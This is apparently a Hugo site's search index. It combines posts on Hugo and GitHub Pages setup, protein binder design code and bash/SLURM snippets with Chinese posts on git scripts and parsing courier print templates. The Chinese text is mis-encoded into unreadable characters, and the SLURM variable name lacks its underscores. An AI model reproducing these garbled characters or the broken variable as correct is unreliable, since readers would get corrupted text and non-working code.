[{"id":0,"href":"/docs/blogs/bioworld/","title":"Biology World","section":"Blog","content":"\rBiology World\r#\rAstrobiology, NASA.\nIn this section, I want to record and share my studies on Computational Biology.\n"},{"id":1,"href":"/docs/blogs/hugo/hugobookgithubaction/","title":"HugoBook+GithubAction","section":"Hugo","content":"\rIn Windows10, build personal website via Hugo-book and Github Actions\r#\rThis blog is about how to use Hugo to create the local website, and then deploy it on GitHub via Github Action. Everything is step by step.\nPrerequisites\r#\rGit Windows 10 VScode Github account Install Hugo\r#\rIn Windows10, right click Windows Powershell and click run as administrator. Refer to How to install chocolatey in Windows to install chocolatey. Refer to Install Hugo on Windows to install Hugo by choco install hugo-extended Make sure Hugo works well by hugo version and we will get the following\nhugo v0.123.7-312735366b20d64bd61bff8627f593749f86c964+extended windows/amd64 BuildDate=2024-03-01T16:16:06Z VendorInfo=gohugoio Create the website using Hugo themes\r#\rFor example, I want to locally work on my website in C:\\myweb folder. Still in Windows Powershell,\nNavigate back to C: driver, and create a new folder by typing mkdir myweb. Create the website by hugo new site Blogs cd Blogs git init Refer to Hugo Book Theme to use hugo-book theme by git submodule add https://github.com/alex-shpak/hugo-book themes/hugo-book Till now, if we run hugo server, we will get a plain website locally. In VS code, open Blogs folder.\nIn C:/myweb/Blogs/themes/hugo-book/exampleSite/content.en/, copy docs folder, posts folder and _index.md file to C:/myweb/Blogs/content/. Why I don\u0026rsquo;t copy the menu folder?\nBecause I found menu folder doesn\u0026rsquo;t work when I modified the website as I needed. We can customize the order of menus in leftbar by adding weight in the name.md file. For example, in each name.md file, the parameter weight determine the order of menues.\n---\rweight: 1\rtitle: One name.md file\r--- Run hugo server again, we will see a more well-done website. Deploy on Github by Action\r#\rCreate a public Github repository. For example, if this repository\u0026rsquo;s name is Blogs, your website link will be like this https://huilin-li.github.io/Blogs/\nStill in Windows Powershell, push your local work to this repository by cd C:/myweb/Blogs\rgit add .\rgit commit -m \u0026#34;update\u0026#34;\rgit branch -M main\rgit remote add origin https://github.com/Huilin-Li/Blogs.git\rgit push -u origin main Visit your GitHub repository. From the main menu choose Settings \u0026gt; Pages. In the center of your screen you will see this: Change the Source to GitHub Actions. Click Configure as the highlight in this picture: Go to Host on GitHub Pages, copy the yaml file in step 6 to Blogs/.github/workflows/hugo.yaml, and commit changes. As Step8, Step9, Step10 in Host on GitHub Pages, the deloyment is done. ğŸ‰ Update website\r#\rAdd more contents in C:/myweb/Blogs/content/ folder, and then git push to Github repository. Github Action will automaticaly update new contents in https://huilin-li.github.io/Blogs/.\nReferences\r#\rHow to install chocolatey in Windows Hugo with Git Hub Pages on Windows Using GitHub Pages with Actions to deploy Hugo sites in seconds - Tommy Byrd // HugoConf 2022 Hugo Book Theme Host on GitHub Pages ã€Hugoã€‘hugo-bookä¸»é¢˜ä½¿ç”¨ Thanks!\r#\rReally appreciate your time for reading my blog, and bless you enjoy your day! If you have any suggestions or comments, please leave them below! (You don\u0026rsquo;t need to login to postğŸ˜‰, feel free to add posts.)\n"},{"id":2,"href":"/docs/me/","title":"Keep Things Simple","section":"Docs","content":"\rKeep Things Simple\r#\r"},{"id":3,"href":"/docs/blogs/bioworld/binderdesign/","title":"TP Binder Design","section":"Biology World","content":"\rBinder Design\r#\rIn this blog, I want to make notes on how I design the binder of the target protein using RFdiffusion, ProteinMPNN-FastRelax and so on.\nAF-A2VEY9-F1, Alphafold.\nIn this case, I take the A2VEY9 as the example. Its 3D view is here\nStep0: Labaries and Helpful tools\r#\rfrom biopandas.pdb import PandasPdb from itertools import chain from Bio import PDB import numpy as np import pandas as pd import plotly.express as px import plotly.graph_objects as go from sklearn.cluster import KMeans I also programmed some helpful tools for computations. We could leave them here, and when these tools are used, we come back and check them.\rdef residue_remove(pdbfile, remove_ids, outputName): \u0026#34;\u0026#34;\u0026#34; Remove residues based on positions. Assumption: pdbfile only has A chain \u0026#34;\u0026#34;\u0026#34; residue_to_remove = [] pdb_io = PDB.PDBIO() pdb_parser = PDB.PDBParser() structure = pdb_parser.get_structure(\u0026#34; \u0026#34;, pdbfile) model = structure[0] chain = model[\u0026#34;A\u0026#34;] for residue in chain: id = residue.id if id[1] in remove_ids: residue_to_remove.append(residue.id) for residue in residue_to_remove: chain.detach_child(residue) pdb_io.set_structure(structure) pdb_io.save(outputName) return def update_resnum(pdbfile): \u0026#34;\u0026#34;\u0026#34; ğŸŒŸ CHANGE RESIDUE NUMBER from discrete position IDs to continuous position IDs Assumption: pdbfile only has A chain \u0026#34;\u0026#34;\u0026#34; pdb_io = PDB.PDBIO() pdb_parser = PDB.PDBParser() structure = pdb_parser.get_structure(\u0026#34; \u0026#34;, pdbfile) model = structure[0] chain = model[\u0026#34;A\u0026#34;] print(len([i for i in chain.get_residues()])) new_resnums = list(range(1, 1+len([i for i in chain.get_residues()]))) for i, residue in enumerate(chain.get_residues()): res_id = list(residue.id) res_id[1] = new_resnums[i] residue.id = tuple(res_id) pdb_io.set_structure(structure) pdb_io.save(pdbfile.split(\u0026#39;pdb\u0026#39;)[0] + \u0026#39;_update_resnum.pdb\u0026#39;) return def point_to_plane_dist(p, p0, p1, p2): \u0026#34;\u0026#34;\u0026#34; The distance from point p to the plane determined by three points (p0, p1, p2) :param p: point p :param p0, p1, p2: three points determine one plane :return: the distance between point to plane \u0026#34;\u0026#34;\u0026#34; u = p1 - p0 v = p2 - p0 # vector normal to plane n = np.cross(u, v) n /= np.linalg.norm(n) p_ = p - p0 dist_to_plane = np.dot(p_, n) return dist_to_plane Step1: Load the target protein.\r#\rThe pdb file can be downloaded here.\ntarget_pdb = PandasPdb().read_pdb(\u0026#39;AF-A2VEY9-F1-model_v4.pdb\u0026#39;) # read structure information into pd.DataFrame target_df = target_pdb.df[\u0026#39;ATOM\u0026#39;] Step2: Truncate target protein\r#\rFor example, I want to remove AAs with very low pLDDT and AAs who are located in the cell membrane. By selecting the most big dark green area, we exclude AAs with very low pLDDT score from highlighted areas. We collect positions of AAs with very low pLDDT are (1-13, 336-693).\nhttps://alphafold.ebi.ac.uk/entry/A2VEY9\nAt the same time, we can get positions of AAs who are located in the transmembrane parts from Subcellular Location section here.\nhttps://www.uniprot.org/uniprotkb/A2VEY9/entry#subcellular_location\n# truncating ids truncating_ids = set(list(range(1,14))+list(range(336,694))+list(range(43,64))+list(range(72,93))+list(range(191,212))+list(range(233,254))+list(range(347,368))) len(truncating_ids) #=455 residue_remove(pdbfile=\u0026#34;AF-A2VEY9-F1-model_v4.pdb\u0026#34;, remove_ids=truncating_ids, outputName=\u0026#34;truncation.pdb\u0026#34;) Let\u0026rsquo;s check this truncated protein in PyMol! We can see that the original protein becomes two much smaller parts, but these two parts are more robust to analysis in next steps.\nOriginal protein (red) and Truncated protein(green)\nStep3. Visualize truncation.pdb with only ğ¶ğ›½ ATOM\r#\rHere, we take ğ¶ğ›½ ATOM as the represent of each AA.\ntruncation = PandasPdb().read_pdb(\u0026#34;truncation.pdb\u0026#34;) cols = [\u0026#34;atom_name\u0026#34;, \u0026#34;residue_name\u0026#34;, \u0026#34;residue_number\u0026#34;, \u0026#34;x_coord\u0026#34;, \u0026#34;y_coord\u0026#34;, \u0026#34;z_coord\u0026#34;] df = truncation.df[\u0026#34;ATOM\u0026#34;][cols] df_CB = df[df[\u0026#34;atom_name\u0026#34;]==\u0026#34;CB\u0026#34;] # visualization fig = go.Figure(data=[go.Scatter3d(x=df_CB[\u0026#34;x_coord\u0026#34;], y=df_CB[\u0026#34;y_coord\u0026#34;], z=df_CB[\u0026#34;z_coord\u0026#34;], name=\u0026#34;\u0026#34;, hoverinfo=\u0026#34;text\u0026#34;, hovertext=df_CB[\u0026#34;residue_number\u0026#34;], mode=\u0026#34;markers\u0026#34;, marker=dict(color=\u0026#34;gray\u0026#34;, size=5))]) fig.update_layout( width=1100, height=1100, margin=dict(l=0, r=0, b=0, t=0), scene=dict(xaxis_title=\u0026#39;x coord\u0026#39;, yaxis_title=\u0026#39;y coord\u0026#39;, zaxis_title=\u0026#39;z coord\u0026#39;)) fig.show() "},{"id":4,"href":"/docs/blogs/bioworld/proteinstruture/","title":"4 levels of protein structure","section":"Biology World","content":"There are four levels of protein structure: primary, secondary, tertiary and quaternary.\nPrimary Structure.\r#\rA proteinâ€™s primary structure is the unique sequence of amino acids in each polypeptide chain that makes up the protein.\nfasta file sequence of 20 amino acids Secondary Structure\r#\rReference:\r#\r3.9: Proteins - Protein Structure Thanks!\r#\rReally appreciate your time for reading my blog, and bless you enjoy your day! If you have any suggestions or comments, please leave them below! (You don\u0026rsquo;t need to login to postğŸ˜‰, feel free to add posts.)\n"},{"id":5,"href":"/docs/blogs/hugo/","title":"Hugo","section":"Blog","content":"\rYour personal website\r#\rThe important reason of why I build this personal website is I want to share my experiences of learning and practicing knowledge and skills. I hope these experiences could help people and save their time a litte bit. Most importantly, this is a great place to share and record solutions to some annoying troubles. ğŸ™Œ\nAt this moment, I use Hugo + Github to build and matintain my personal website. Therefore, you will see how I build and add new features in this website under the framework of Hugo, how I solve troubles, what references I refer, and so on. Let\u0026rsquo;s keep things simple! You can get these following experiences here, and hope they woule be helpful to you!\nIn Windows 10, build personal website via Hugo-book theme and deploy the static website to github via Github Action. Some commands you might use when building a website: Insert images and resize and center images Add emoji Add a travel map Why my local website doesn\u0026rsquo;t update after I update my markdown files? Link to pages and titles Add a comment section Thanks!\r#\rReally appreciate your time for reading my blog, and bless you enjoy your day! If you have any suggestions or comments, please leave them below! (You don\u0026rsquo;t need to login to postğŸ˜‰, feel free to add posts.)\n"},{"id":6,"href":"/docs/blogs/hugo/hugo/","title":"Hugo Commands","section":"Hugo","content":"\rHow to insert images and resize and center images?\r#\rThe file tree is like\nâ”œâ”€content\râ”‚ â”‚ _index.md\râ”‚ â”‚\râ”‚ â””â”€docs\râ”‚ â”œâ”€blogs\râ”‚ â”‚ â”‚ hugo.md\râ”‚ â”‚ â”‚ _index.md\râ”‚ â”‚ â”‚\râ”‚ â”‚ â””â”€images\râ”‚ â”‚ Nice.png In hugo.md file, we add Nice.png and scale it by\n{{\u0026lt; figure src=\u0026#34;../images/Nice.png\u0026#34; width=\u0026#34;400\u0026#34; alt=\u0026#34; \u0026#34; \u0026gt;}} Why we need to add ../ in front of images folder, altough hugo.md file and images folder are at the same level? Because Hugo system sees hugo.md as a foler too. However, Hugo system sees _index.md as a file! Therefore, If we want to insert iamges in _index.md file, the command will be like:\n{{\u0026lt; figure src=\u0026#34;./images/Nice.png\u0026#34; width=\u0026#34;400\u0026#34; alt=\u0026#34; \u0026#34; \u0026gt;}} Center the image?\n\u0026lt;center\u0026gt;{ {\u0026lt;figure src=\u0026#34;../images/Nice.png\u0026#34; width=\u0026#34;400\u0026#34; alt=\u0026#34; \u0026#34;\u0026gt;} }\u0026lt;/center\u0026gt; At the same time, in hugo.toml, add\n[markup]\r[markup.goldmark]\r[markup.goldmark.renderer]\runsafe = true How to add emoji?\r#\rDirectly copy emoji icon ğŸ‘‹ and paste to .md file, instead of using :wave:.\nEmoji Cheat Sheet: https://github.com/ikatyang/emoji-cheat-sheet/blob/master/README.md\nHow to add a travel map in Hugo?\r#\rRefer to this article\nNOTE:\nIn {{\u0026lt; openstreetmap mapName=\u0026quot;\u0026lt;your map name\u0026gt;\u0026quot; \u0026gt;}}, the \u0026lt;your map name\u0026gt; is not the name you give to your map, but the name in the website link of your map. For example, I created a map whose name is Travel, I need to use travel_1036974 in the hugo shortcode. Why my local website doesn\u0026rsquo;t update after I update my markdown files?\r#\rGood question. I also find my local website does not update although I have save my changes. I am not clear the excat reason, but It works well if I Pree Ctrl+C to stop the local host, and hugo server again, I can see the updated website in http://localhost:1313/.\nHow to link pages and tiles?\r#\rI am in now.md file now, and there is another page.md which has #Title I want to link. I want to link to page.md and link to #Title I want to link. In page.md file, add an anchor:\n# Title I want to link {#anchor} In now.md file, add commands:\n[text] ( {{\u0026lt; ref \u0026#34;./pages.md\u0026#34; \u0026gt;}} ) # link to one page [text] ( {{\u0026lt; ref \u0026#34;./pages.md#anchor\u0026#34; \u0026gt;}} ) # link to the title I want to add a comment section (via Cactus Comments).\r#\rRegister a Matrix account via https://app.element.io/#/login. Login. register comments by The name we will use to add comment section is huilinBlog. Create and add chat.html. In my case, my root directory is Blogs/ and chat.html is added to Blogs/layouts/shortcodes/ in which shortcodes folder is also created by yourself. â”œâ”€.github\râ”œâ”€layouts\râ”‚ â””â”€shortcodes\râ””â”€themes\râ”œâ”€hugo-book\râ”‚ â”œâ”€.github\râ”‚ â”œâ”€layouts\râ”‚ â”‚ â”œâ”€shortcodes NOTE: Do not add chat.html to themes/layouts/shortcodes/, because we are not authorized to modify the the theme github via git push and so on.\nCopy the following and paste to chat.html, and replace \u0026lt;YOUR-SITE-NAME\u0026gt; with comments, like siteName: \u0026quot;comments\u0026quot;, \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://latest.cactus.chat/cactus.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://latest.cactus.chat/style.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt;\r\u0026lt;div id=\u0026#34;comment-section\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rinitComments({\rnode: document.getElementById(\u0026#34;comment-section\u0026#34;),\rdefaultHomeserverUrl: \u0026#34;https://matrix.cactus.chat:8448\u0026#34;,\rserverName: \u0026#34;cactus.chat\u0026#34;,\rsiteName: \u0026#34;\u0026lt;YOUR-SITE-NAME\u0026gt;\u0026#34;,\rcommentSectionId: \u0026#34;{{ index .Params 0 }}\u0026#34;\r})\r\u0026lt;/script\u0026gt; Add the chat comment section to post. References\r#\rhugo book demo ã€Hugoã€‘hugo-bookä¸»é¢˜ä½¿ç”¨ hugoåšå®¢ æ–‡å†…æ’å…¥å›¾ç‰‡ How to render markdown url with .md to correct link Linking pages in Hugo/markdown Added Cactus Comments to Hugo Cactus Comments Thanks!\r#\rReally appreciate your time for reading my blog, and bless you enjoy your day! If you have any suggestions or comments, please leave them below! (You don\u0026rsquo;t need to login to postğŸ˜‰, feel free to add posts.)\n"},{"id":7,"href":"/docs/travel/","title":"World","section":"Docs","content":"\rWorld\r#\r"},{"id":8,"href":"/docs/blogs/shell/","title":"Bash Scripts","section":"Blog","content":"\rBash Scripts\r#\rHow to discard changes in VScode?\r#\rNavigate to reporsitory (has .github folder) with changes. Then, git restore \u0026lt;file\u0026gt; Activate conda environment in bash script\r#\rsource ~/miniconda3/etc/profile.d/conda.sh conda activate ENV SBATCH Array jobs\r#\r#SBATCH -J array-job\t#SBATCH -a 1-3 #SBATCH -o array-job.%A.%a.log id_list=\u0026#34;./id_list.txt\u0026#34; id=`head -n $SLURM ARRAY TASK ID $id_list | tail -n 1` python3 script.py -in $id "},{"id":9,"href":"/posts/%E6%89%B9%E9%87%8F%E6%9B%B4%E6%96%B0%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%BB%93%E5%BA%93%E4%BF%A1%E6%81%AF/","title":"æ‰¹é‡æ›´æ–°æœ¬åœ°ä»£ç ä»“åº“ä¿¡æ¯","section":"æˆ‘çš„åšå®¢","content":"\rå‰è¨€\r#\ræœ¬åœ°ä»“åº“é¡¹ç›®å¾ˆå¤šï¼Œä¿¡æ¯åˆä¸æ˜¯æœ€æ–°ï¼Œè‡ªå·±åˆä¸æƒ³é‡æ–°æ‹‰å–é¡¹ç›®ã€‚\næ‰€ä»¥å°±æ•´äº†ä¸€ä¸ªæ‰¹é‡æ›´æ–°æœ¬åœ°ä»£ç ä»“åº“ä¿¡æ¯è„šæœ¬ï¼Œè®°å½•ä¸€ä¸‹ã€‚\nä»£ç \r#\r# å½“å‰ç›®å½• basedir=`pwd` master=\u0026#34;master\u0026#34; mybranch=\u0026#34;mybranch\u0026#34; for dir in $(ls $basedir); do if [ -d $basedir/$dir ]; then branch=`cd $basedir/$dir \u0026amp;\u0026amp; git branch | sed -n \u0026#39;/\\* /s///p\u0026#39;` yes=\u0026#34;y\u0026#34; if [[ $branch != $master \u0026amp;\u0026amp; $branch != $mybranch ]]; then read -p \u0026#34;update $basedir/$dir -- $branch: y/n/f\u0026#34; yes fi # åˆ‡æ¢åˆ°masteråˆ†æ”¯ï¼Œå¹¶åˆ é™¤åŸåˆ†æ”¯ if [[ $yes = \u0026#39;f\u0026#39; ]] \u0026amp;\u0026amp; [[ $branch != $master \u0026amp;\u0026amp; $branch != $mybranch ]]; then cd $basedir/$dir \u0026amp;\u0026amp; git branch -D master cd $basedir/$dir \u0026amp;\u0026amp; git checkout -b master origin/master \u0026amp;\u0026amp; git remote update origin --prune cd $basedir/$dir \u0026amp;\u0026amp; git branch -D $branch fi # æ›´æ–°åˆ†æ”¯ä¿¡æ¯ if [[ $yes = \u0026#39;y\u0026#39; ]] \u0026amp;\u0026amp; [[ $branch = $master || $branch = $mybranch ]]; then echo \u0026#34;å¼€å§‹æ›´æ–°ä»“åº“ã€$dirã€‘...\u0026#34; cd $basedir/$dir \u0026amp;\u0026amp; git pull origin master \u0026amp;\u0026amp; git remote update origin --prune echo \u0026#34;æ›´æ–°ä»“åº“ã€$dirã€‘å®Œæˆ\u0026#34; fi fi done "},{"id":10,"href":"/posts/%E4%B8%80%E6%AC%A1%E7%BC%96%E8%BE%91%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE%E8%AE%BE%E8%AE%A1%E6%80%BB%E7%BB%93/","title":"ä¸€æ¬¡ç¼–è¾‘å¤§é‡æ•°æ®è®¾è®¡æ€»ç»“","section":"æˆ‘çš„åšå®¢","content":"\rè®°å½•è®°å½•\r#\räº§å“ä¸‹æ¥ä¸€ä¸ªéœ€æ±‚ï¼Œæ˜¯åšä¸€ä¸ªä»·æ ¼ç­–ç•¥åŠŸèƒ½ï¼Œæµç¨‹å¤§æ¦‚æ˜¯å»ºç«‹ä¸€ä¸ªç­–ç•¥ï¼Œç„¶åæ·»åŠ ä¸€æ‰¹å•†å“ï¼Œå¯¹è¿™äº›å•†å“è¿›è¡Œè®¾ç½®è§„åˆ™ã€‚\nåœ¨åˆ†æçš„æ—¶å€™ï¼Œå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œäº§å“ä¸Šéœ€è¦å¯¹ä¸€æ‰¹å•†å“æ•°æ®è¿›è¡Œç¼–è¾‘ï¼Œå…¨éƒ¨ç¼–è¾‘å®Œæˆä¹‹åæ‰ä¿å­˜ï¼Œç¼–è¾‘å®Œæˆä¹‹åä¹Ÿå¯èƒ½ä¸¢å¼ƒã€‚\né—®é¢˜æ˜¯è¿™ä¸€æ‰¹æ•°æ®æœ‰å¯èƒ½ä¼šå¾ˆå¤§ï¼Œè¾¾åˆ°10å‡ ä¸‡çš„æ•°æ®ï¼Œä¸èƒ½è®©å‰ç«¯å…¨éƒ¨æ‹‰ä¸‹æ¥ï¼Œç¼–è¾‘å®Œæˆåï¼Œå†ä¸€æ¬¡ä¼ ç»™åç«¯ä¿å­˜ã€‚æ‹‰å–å…¨éƒ¨æ•°æ®ï¼Œä¼šå¯¹æœåŠ¡ç«¯é€ æˆå¾ˆå¤§å‹åŠ›ï¼Œè¿˜å¯èƒ½é€ æˆå†…å­˜é—®é¢˜ï¼ŒåŒæ—¶å‰ç«¯ä¸€æ¬¡å‘é€å¤§é‡æ•°æ®ç»™åç«¯ä¿å­˜ä¹Ÿæ˜¯æœ‰é—®é¢˜çš„ï¼Œä¸€æ˜¯ä¼ è¾“é—®é¢˜ï¼Œå¤§é‡æ•°æ®ç½‘ç»œä¼ è¾“æ…¢ï¼ŒäºŒæ˜¯åç«¯å¤„ç†é—®é¢˜ï¼Œéœ€è¦å¤„ç†å¤§é‡æ•°æ®ï¼Œå†ä¸€æ¬¡æ€§ä¿å­˜åˆ°æ•°æ®åº“ï¼Œæ•´ä¸ªæµç¨‹ä¸‹æ¥æ˜¯ä¼šå ç”¨äº†å¤§é‡æ—¶é—´ï¼Œæ¥å£è¯·æ±‚å¾ˆæ…¢ï¼›ä»ç”¨æˆ·ç«¯ä½“éªŒæ¥è¯´ï¼Œæ˜¯åŠŸèƒ½å¡é¡¿ã€‚\nåªèƒ½å†æƒ³æƒ³å…¶ä»–æ–¹æ¡ˆï¼ŒæŒ‰ç…§ä»¥å‰çš„æ“ä½œï¼Œç¼–è¾‘ç¬¬ä¸€é¡µæ•°æ®ï¼Œä¿å­˜ä¸‹æ¥ï¼Œæ¥ç€å¯¹ä¸‹ä¸€é¡µè¿›è¡Œç¼–è¾‘ï¼Œå†ä¿å­˜ã€‚è¿™ç§æ–¹å¼ä¸€æ¬¡è¯·æ±‚å’Œæ“ä½œçš„æ•°æ®é‡ä¸å¤šï¼Œè¯·æ±‚å’Œå“åº”ä¸Šæ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ç¼–è¾‘å®Œä¸€é¡µå°±ä¿å­˜ï¼Œè¾¾ä¸åˆ°äº§å“ä¸Šçš„æ•ˆæœï¼Œä¸€æ¬¡ç¼–è¾‘å®Œæ‰€æœ‰çš„å•†å“ï¼Œç¼–è¾‘å®Œåå†ä¿å­˜ã€‚\næ‰€ä»¥ï¼Œæˆ‘åœ¨æƒ³å¦‚æœä¸€æ¬¡è¯·æ±‚å°‘é‡æ•°æ®ï¼Œæœ€ååˆæ˜¯ä¸€æ¬¡æ€§ä¿å­˜ç¼–è¾‘åçš„ç»“æœï¼Œé‚£å°±è¾¾åˆ°æˆ‘ä»¬çš„è¦æ±‚ã€‚\né¡ºç€è¿™ä¸ªæ€è·¯ï¼Œå¦‚æœä½¿ç”¨ä¸€ä¸ªä¸­é—´è¡¨æŠŠè¿™äº›æ“ä½œæ•°æ®è½¬ç§»åˆ°æœåŠ¡ç«¯ï¼Œå…ˆä¸ä¿å­˜ï¼Œç­‰å…¨éƒ¨ç¼–è¾‘å®Œæˆåå†ä¿å­˜ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥è¾¾åˆ°è¿™ä¸ªæ•ˆæœï¼Œæ¯ä¸€é¡µä¿®æ”¹çš„æ•°æ®éƒ½æš‚å­˜åœ¨è¿™é‡Œï¼Œæœ€åä¿å­˜æ—¶å†ä¸€èµ·ä¿å­˜ä¸Šå»ï¼Œåœ¨å›æ˜¾æ—¶ï¼Œä¹Ÿä¼˜åŒ–å›æ˜¾ç¼–è¾‘åçš„æ•°æ®ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†å¯ä»¥ä¸€æ¬¡ç¼–è¾‘å‡ ç™¾é¡µï¼Œæœ€åå†ä¸€èµ·ä¿å­˜ï¼Œåœ¨æ€§èƒ½ä¸Šåˆæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚\nå½“ç„¶ï¼Œè¿™æ ·åšè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯åœ¨ç¼–è¾‘æ—¶ï¼Œä¼šä¿å­˜ä¸€ä¸ªä¸´æ—¶æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æ¯æ¬¡éƒ½åªæ˜¯ä¿®æ”¹ï¼Œæ²¡æœ‰è¿›è¡Œä¿å­˜ï¼Œé‚£è¡¨ä¸Šçš„ä¸´æ—¶æ•°æ®ä¼šäº§ç”Ÿå¾ˆå¤šï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿéœ€è¦åšä¸€ä¸ªæ•°æ®æ¸…ç†æ“ä½œï¼Œä¹Ÿå°±æ˜¯æ¯å¤©ã€æˆ–è€…æ¯ä¸ªå°æ—¶æ¸…ç†ä¸€ä¸‹æ²¡ç”¨çš„æ•°æ®ã€‚\n"},{"id":11,"href":"/posts/%E4%B8%80%E6%AC%A1%E8%8F%9C%E9%B8%9F%E7%94%B5%E5%AD%90%E9%9D%A2%E5%8D%95%E8%93%9D%E7%89%99%E6%89%93%E5%8D%B0%E6%94%B9%E9%80%A0%E6%80%BB%E7%BB%93/","title":"ä¸€æ¬¡èœé¸Ÿç”µå­é¢å•è“ç‰™æ‰“å°æ”¹é€ æ€»ç»“","section":"æˆ‘çš„åšå®¢","content":"\rå‰è¨€\r#\rèœé¸Ÿç”µå­é¢å•å¹³å°åœæ­¢è“ç‰™æ‰“å°æœåŠ¡è®¢è´­ï¼Œå¾ˆå·§åˆï¼Œå…¬å¸å°±ä½¿ç”¨åˆ°äº†ä»–ï¼Œä¸€ä¸ªæ˜¯PCèœé¸Ÿç»„ä»¶ï¼Œä¸€ä¸ªæ˜¯è“ç‰™æ‰“å°ï¼Œåè€…çš„åœç”¨ä¼šå¯¹ä¸šåŠ¡ä¸Šäº§ç”Ÿä¸€äº›å½±å“ï¼Œæ‰€ä»¥ä¹Ÿè¦å¯¹å…¶åšä¸€äº›ä¸šåŠ¡ä¸Šå¤„ç†ã€‚\nèœé¸Ÿç”µå­é¢å•å…¬å‘Šï¼š\nå°Šæ•¬çš„å¼€å‘è€…ï¼š æ‚¨å¥½ï¼ä¸ºè¿›ä¸€æ­¥è½å®å›½å®¶ã€åœ°æ–¹æ³•å¾‹ã€æ³•è§„å…³äºåŠ å¼ºæ¶ˆè´¹è€…ä¸ªäººä¿¡æ¯ä¿æŠ¤ä»¥åŠè§„èŒƒæ•°æ®å¤„ç†è¡Œä¸ºçš„å…·ä½“è¦æ±‚ï¼Œæˆ‘å…¬å¸è‡ª2023å¹´6æœˆ30æ—¥èµ·åœæ­¢è“ç‰™æ‰“å°æœåŠ¡è®¢è´­ï¼Œ6æœˆ30å‰è®¢è´­çš„è“ç‰™æ‰“å°æœåŠ¡åœ¨æœ‰æ•ˆæœŸå†…ä»å¯ç»§ç»­ä½¿ç”¨ã€‚å¦å¤–ï¼Œæ‚¨å¯ç»§ç»­ä½¿ç”¨è£…é¸Ÿæä¾›çš„4Gäº‘æ‰“å°æœåŠ¡åŠPCèœé¸Ÿç»„ä»¶æœ‰çº¿æ‰“å°æœåŠ¡ï¼Œä¸å—å½±å“ã€‚ å¦‚æ‚¨å¯¹è“ç‰™æ‰“å°æ¥å£å…³é—­äº‹å®œæœ‰ä»»ä½•ç–‘é—®ï¼Œå¯åŠ å…¥èœé¸Ÿé’‰é’‰ç¾¤ï¼ˆç¾¤å·ï¼š44766762ï¼‰è¿›è¡Œæ²Ÿé€šã€‚ æ„Ÿè°¢æ‚¨å¯¹å¹³å°çš„æ”¯æŒä¸å…³æ³¨ï¼æµ™æ±Ÿèœé¸Ÿä¾›åº”é“¾ç®¡ç†æœ‰é™å…¬å¸ 2023å¹´5æœˆ12æ—¥\né—®é¢˜åˆ†æ\r#\rä¸ºäº†å‡å°‘å¯¹ä¸šåŠ¡çš„å½±å“ï¼Œåšäº†å¹¶è¡Œçš„ä¸¤å¥—æ–¹æ¡ˆï¼š\n1ã€ç›´æ¥åœæ­¢æ­¤æœåŠ¡ï¼Œè®©ç”¨æˆ·å»PCç«¯æ‰“å°ï¼Œå¹¶åšå¥½æç¤ºï¼›\n2ã€è‡ªå·±è§£æèœé¸Ÿæ¨¡æ¿çš„æ‰“å°æŒ‡ä»¤ã€‚\nå¦‚æœèƒ½å®Œæˆæ¨¡æ¿æŒ‡ä»¤çš„è§£æï¼Œå°±ç›´æ¥ä¸ŠæŒ‡ä»¤è§£æï¼Œé‚£æ˜¯éå¸¸ç”¨å®Œç¾çš„ï¼Œå¯¹ç”¨æˆ·é›¶å½±å“ï¼Œæ— ç¼å¹³æ»‘è¿‡å»ï¼›å½“ç„¶ï¼Œè§£æèœé¸Ÿæ¨¡æ¿çš„æŒ‡ä»¤ä¹Ÿä¸æ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ï¼Œæ—¶é—´ä¹Ÿå¾ˆç´§å¼ ï¼Œåªæœ‰ä¸€å‘¨å¤šçš„æ—¶é—´ï¼Œæ‰€ä»¥ä¹Ÿå‡†å¤‡ä¹Ÿç¬¬äºŒå¥—æ–¹æ¡ˆï¼Œä¸èƒ½ä¸ŠæŒ‡ä»¤è§£æï¼Œå°±è®©ç”¨æˆ·å»PCç«¯æ‰“å°ï¼ŒåŒæ—¶å‹å¥½åœ°æç¤ºç”¨æˆ·ã€‚\nä¸€äº›é‡è¦ä¿¡æ¯çš„æ•´ç†\næ•´ç†ç³»ç»Ÿé‡Œçš„è®¢é˜…ç‰©æµå…¬å¸ï¼Œç›®å‰éœ€è¦å¤„ç†ä»¥ä¸‹ç‰©æµå°±å¯ä»¥ï¼š\nä¸­é€šé€Ÿé€’\tZTO\nç”³é€šå¿«é€’\tSTO\néŸµè¾¾å¿«é€’\tYUNDA\nåœ†é€šé€Ÿé€’\tYTO\nå¾·é‚¦\tDBKD\nèœé¸ŸCLOUDPRINT_CMD_RENDERæ¥å£ç¤ºä¾‹\næ‰“å°æ¨¡æ¿ç¤ºä¾‹\nèœé¸Ÿç”µå­é¢å•è§£æåˆ†æè¿‡ç¨‹\r#\rä»¥http://cloudprint.cainiao.com/template/standard/401ä¸ºä¾‹ï¼Œåˆ†æèœé¸Ÿç”µå­é¢å•çš„è§£æè¿‡ç¨‹ã€‚\næ•´ä½“æ¨¡æ¿ä¸»è¦ä»¥jsè¯­æ³•å’Œxmlæ ‡ç­¾ä¸ºä¸»ï¼Œæ‰€ä»¥æœ‰å¯èƒ½æ˜¯å…ˆä½¿ç”¨jsæ¨¡æ¿å¼•æ“è§£æï¼Œå†è§£æxmlæˆæŒ‡ä»¤ï¼š\næ¨¡æ¿ + æ•°æ® -\u0026gt; é€šè¿‡jsæ¨¡æ¿å¼•æ“ -\u0026gt; xml æ¨¡æ¿ -\u0026gt; é€šè¿‡è§£æ xml 